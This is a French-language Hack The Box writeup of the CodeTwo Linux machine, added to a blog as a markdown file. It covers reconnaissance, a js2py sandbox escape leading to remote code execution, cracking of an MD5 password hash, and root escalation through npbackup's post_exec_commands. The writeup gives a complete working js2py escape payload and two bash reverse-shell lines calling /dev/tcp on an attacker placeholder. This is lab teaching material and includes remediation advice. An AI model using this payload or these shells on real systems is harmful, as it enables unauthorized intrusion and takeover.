@@ -1,0 +1,364 @@
+---
+title: "CodeTwo - Hack The Box"
+date: "2025-08-22"
+tags: ["remote-code-execution", "privilege-escalation", "MD5", "sudo-exploit"]
+draft: false
+summary: >-
+  Machine Linux sur Hack The Box exploitant une vulnérabilité js2py pour RCE,
+  crack de hashes MD5 pour mouvement latéral, et exploitation d'un outil de backup avec privilèges sudo.
+images:
+  - /static/images/codetwo/codetwo_logo.png
+---
+
+# CodeTwo - Writeup Hack The Box
+
+## Introduction
+
+CodeTwo est une machine Linux de difficulté Easy sur Hack The Box et qui présente une application web Flask vulnérable permettant l'exécution de code JavaScript. Le parcours vers root implique l'exploitation d'une vulnérabilité dans js2py, le crack de hashes MD5, et l'exploitation d'un outil de backup avec des privilèges sudo.
+
+## Reconnaissance
+
+### Scan des ports
+
+Commençons par un scan nmap standard :
+
+```bash
+$ nmap -sC -sV 10.10.11.82
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+8000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.8.10)
+```
+
+Deux services sont exposés : SSH sur le port 22 et une application web Python sur le port 8000.
+
+### Énumération Web
+
+Ajoutons d'abord l'hôte à notre fichier hosts :
+
+```bash
+$ sudo vim /etc/hosts
+10.10.11.82 codetwo.htb
+```
+
+L'énumération avec ffuf révèle plusieurs endpoints intéressants :
+
+```bash
+$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://codetwo.htb:8000/FUZZ
+
+dashboard               [Status: 302]
+download                [Status: 200]
+login                   [Status: 200]
+logout                  [Status: 302]
+register                [Status: 200]
+```
+
+### Analyse de l'application
+
+En téléchargeant le fichier depuis `/download`, nous obtenons le code source de l'application. L'analyse révèle plusieurs points intéressants :
+
+1. **Hashage MD5 faible** pour les mots de passe
+2. **js2py** utilisé pour exécuter du code JavaScript
+3. **Secret key hardcodée** : `S3cr3tK3yC0d3Tw0`
+4. **Base SQLite** pour stocker les utilisateurs et codes
+
+## Obtention du shell initial
+
+### Tentatives d'exploitation
+
+#### Échec 1 : Exploitation directe de js2py
+
+Les premières tentatives d'exploitation classiques de js2py ont échoué :
+
+```javascript
+// Tentatives échouées
+process.env; // ReferenceError: process is not defined
+require("fs"); // ReferenceError: require is not defined
+__import__; // ReferenceError: __import__ is not defined
+```
+
+L'environnement js2py est très restreint, sans accès direct à `process`, `require` ou aux variables Python.
+
+#### Échec 2 : Accès direct aux attributs Python
+
+```javascript
+"".__class__; // Ne retourne rien
+"".__class__.__mro__; // TypeError: Undefined and null dont have properties
+```
+
+Les méthodes classiques d'accès aux classes Python via les objets JavaScript sont bloquées.
+
+### Exploitation réussie : CVE js2py
+
+Après recherche, j'ai découvert une vulnérabilité dans js2py permettant de contourner `disable_pyimport()`. La vulnérabilité exploite `Object.getOwnPropertyNames` pour accéder aux attributs Python.
+
+#### Découverte des classes disponibles
+
+D'abord, j'ai énuméré les subclasses disponibles :
+
+```javascript
+var h = Object.getOwnPropertyNames({});
+var g = h.__getattribute__("__getattribute__");
+var c = g("__class__").__base__;
+var subs = c.__subclasses__();
+var found = "";
+for (var i = 0; i < subs.length; i++) {
+  try {
+    var name = subs[i].__name__;
+    if (name == "catch_warnings" || name == "Popen") {
+      found += i + ":" + name + " | ";
+    }
+  } catch (e) {}
+}
+found;
+```
+
+Résultat : `139:catch_warnings | 317:Popen |`
+
+#### Payload final pour RCE
+
+Avec l'index de `catch_warnings` identifié, j'ai pu exécuter des commandes :
+
+```javascript
+var h = Object.getOwnPropertyNames({});
+var g = h.__getattribute__("__getattribute__");
+var c = g("__class__").__base__;
+var subs = c.__subclasses__();
+var cw = subs[139];
+var w = cw();
+var os = w._module.__builtins__["__import__"]("os");
+os.system("bash -c 'bash -i >& /dev/tcp/MON_IP/4444 0>&1'");
+```
+
+## Explication détaillée de l'exploitation js2py
+
+### Comprendre la vulnérabilité js2py
+
+La vulnérabilité exploite une faille fondamentale dans l'implémentation de js2py. Même si `disable_pyimport()` est activé pour empêcher l'importation directe de modules Python, js2py doit toujours créer un pont entre les objets JavaScript et Python pour fonctionner. C'est ce pont qui est exploité.
+
+### Déconstruction du payload étape par étape
+
+#### Étape 1 : Accès initial via Object.getOwnPropertyNames
+
+```javascript
+var h = Object.getOwnPropertyNames({});
+```
+
+Cette ligne est cruciale. `Object.getOwnPropertyNames({})` retourne un array JavaScript des propriétés d'un objet vide. Mais dans js2py, cet array JavaScript est en réalité un objet Python déguisé qui conserve ses attributs Python comme `__getattribute__`.
+
+#### Étape 2 : Récupération de la méthode **getattribute**
+
+```javascript
+var g = h.__getattribute__("__getattribute__");
+```
+
+Ici, on accède à la méthode Python `__getattribute__` via l'objet array. Cette méthode permet d'accéder à n'importe quel attribut d'un objet Python. C'est notre porte d'entrée vers l'écosystème Python.
+
+#### Étape 3 : Remontée vers la classe object
+
+```javascript
+var c = g("__class__").__base__;
+```
+
+- `g("__class__")` récupère la classe de l'objet (probablement `list` ou `dict_keys`)
+- `.__base__` remonte à la classe parente, qui est `object` - la classe de base de toutes les classes Python
+
+#### Étape 4 : Énumération des subclasses
+
+```javascript
+var subs = c.__subclasses__();
+```
+
+`object.__subclasses__()` retourne TOUTES les classes qui héritent d'object dans l'interpréteur Python actuel. C'est une mine d'or car cela inclut des classes système comme :
+
+- `warnings.catch_warnings`
+- `subprocess.Popen`
+- Des centaines d'autres classes
+
+### Pourquoi catch_warnings ?
+
+La classe `catch_warnings` (index 139) est particulièrement intéressante car :
+
+1. **Accès aux modules** : Son instance contient `_module` qui référence le module warnings
+2. **Accès à **builtins**** : Via `_module.__builtins__`, on accède aux fonctions built-in de Python
+3. **Import dynamique** : `__builtins__["__import__"]` permet d'importer n'importe quel module Python
+
+### Le chemin vers l'exécution de commandes
+
+```javascript
+var cw = subs[139]; // Récupère la classe catch_warnings
+var w = cw(); // Crée une instance
+var os = w._module.__builtins__["__import__"]("os"); // Importe le module os
+os.system("commande"); // Exécute une commande système
+```
+
+### Pourquoi Popen n'a pas fonctionné directement
+
+Bien que `Popen` (index 317) soit trouvé, son utilisation directe était plus complexe :
+
+```javascript
+var popen = subs[317];
+// Popen nécessite des arguments spécifiques pour son constructeur
+var proc = popen("whoami", -1, null, -1, -1, -1, null, null, true);
+```
+
+Les erreurs `Object of type bytes is not JSON serializable` indiquaient que la sortie ne pouvait pas être sérialisée pour la réponse HTTP.
+
+### Visualisation du chemin d'exploitation
+
+```
+JavaScript (js2py)
+    ↓
+Object.getOwnPropertyNames({})  [Objet Python déguisé]
+    ↓
+__getattribute__  [Méthode Python]
+    ↓
+__class__.__base__  [Classe 'object']
+    ↓
+__subclasses__()  [Toutes les classes Python]
+    ↓
+catch_warnings  [Classe avec accès aux modules]
+    ↓
+_module.__builtins__  [Fonctions built-in]
+    ↓
+__import__("os")  [Import du module os]
+    ↓
+os.system()  [Exécution de commandes]
+```
+
+Cette chaîne d'exploitation montre comment, partant d'un simple objet JavaScript, on peut remonter jusqu'à l'exécution de commandes système en exploitant les mécanismes internes de Python exposés par js2py.
+
+Cela m'a donné un shell en tant qu'utilisateur `app`.
+
+## Escalade horizontale : app -> marco
+
+### Analyse de la base de données
+
+Une fois sur le système, j'ai exploré la base SQLite de l'application :
+
+```bash
+app@codetwo:~/app$ sqlite3 instance/users.db
+sqlite> SELECT * FROM user;
+1|marco|649c9d65a206a75f5abe509fe128bce5
+2|app|a97588c0e2fa3a024876339e27aeb42e
+```
+
+### Crack du hash MD5
+
+J'ai utilisé CrackStation pour cracker le hash MD5 de marco :
+
+- Hash : `649c9d65a206a75f5abe509fe128bce5`
+- Mot de passe : `sweetangelbabylove`
+
+### Connexion SSH
+
+```bash
+$ ssh marco@10.10.11.82
+Password: sweetangelbabylove
+```
+
+### Récupération du flag user
+
+```bash
+marco@codetwo:~$ cat user.txt
+9e8c************************4b43
+```
+
+## Escalade de privilèges : marco -> root
+
+### Énumération des privilèges
+
+```bash
+marco@codetwo:~$ sudo -l
+User marco may run the following commands on codetwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+Marco peut exécuter `npbackup-cli` en tant que root sans mot de passe.
+
+### Analyse de npbackup-cli
+
+NPBackup est un outil de sauvegarde basé sur Python. L'analyse révèle :
+
+```bash
+marco@codetwo:~$ file /usr/local/bin/npbackup-cli
+/usr/local/bin/npbackup-cli: Python script, ASCII text executable
+
+marco@codetwo:~$ find / -name "*npbackup*" 2>/dev/null
+/home/marco/npbackup.conf
+/usr/local/bin/npbackup-cli
+[...]
+```
+
+Un fichier de configuration existe dans le home de marco.
+
+### Exploitation via la configuration
+
+NPBackup permet l'exécution de commandes via les options `post_exec_commands` dans la configuration.
+
+#### Création d'une configuration malveillante
+
+J'ai copié et modifié la configuration existante :
+
+```bash
+marco@codetwo:~$ cp npbackup.conf myconf.conf
+marco@codetwo:~$ vim myconf.conf
+```
+
+Modifications apportées :
+
+```yaml
+repo_opts:
+  minimum_backup_age: 0 # Force le backup immédiat
+
+backup_opts:
+  paths:
+    - /home/marco/trigger.txt # Fichier à  backuper
+
+  post_exec_commands:
+    - "/bin/bash -c 'bash -i >& /dev/tcp/MON_IP/4444 0>&1'"
+```
+
+#### Déclenchement de l'exploit
+
+```bash
+# Création du fichier trigger pour forcer un nouveau backup
+marco@codetwo:~$ touch trigger.txt
+
+# Exécution du backup avec notre config malveillante
+marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c /home/marco/myconf.conf --backup
+```
+
+Le backup s'exécute et déclenche la commande post-exécution, nous donnant un shell root :
+
+```bash
+# Sur notre machine
+$ nc -lvnp 4444
+```
+
+### Récupération du flag root
+
+```bash
+root@codetwo:~$ cat /root/root.txt
+[FLAG ROOT]
+```
+
+## Leçons apprises
+
+### Vulnérabilités exploitées
+
+1. **js2py sandbox bypass** : Même avec `disable_pyimport()`, js2py reste vulnérable à l'échappement du sandbox
+2. **Hashage MD5** : Algorithme obsolète et facilement crackable
+3. **Configuration non sécurisée** : NPBackup permet l'exécution de commandes arbitraires via sa configuration
+
+### Recommandations de sécurisation
+
+1. **Éviter l'exécution de code utilisateur** : Même "sandboxé", l'exécution de code reste dangereuse
+2. **Utiliser des algorithmes modernes** : bcrypt, argon2 ou scrypt pour le hashage des mots de passe
+3. **Principe du moindre privilège** : Restreindre les fonctionnalités des outils avec sudo
+4. **Validation des configurations** : Les fichiers de configuration ne devraient pas permettre l'exécution de commandes arbitraires
+
+## Conclusion
+
+CodeTwo est une machine éducative qui illustre parfaitement les dangers de faire confiance à  des mécanismes de sandboxing et l'importance d'une défense en profondeur. La chaîne d'exploitation, de js2py à npbackup, montre comment plusieurs vulnérabilités mineures peuvent s'enchaîner pour compromettre complètement un système.
+
+Cette machine m'a particulièrement fait progresser sur la compréhension des mécanismes de sandboxing JavaScript et l'importance de bien lire les documentations des outils qu'on exploite.
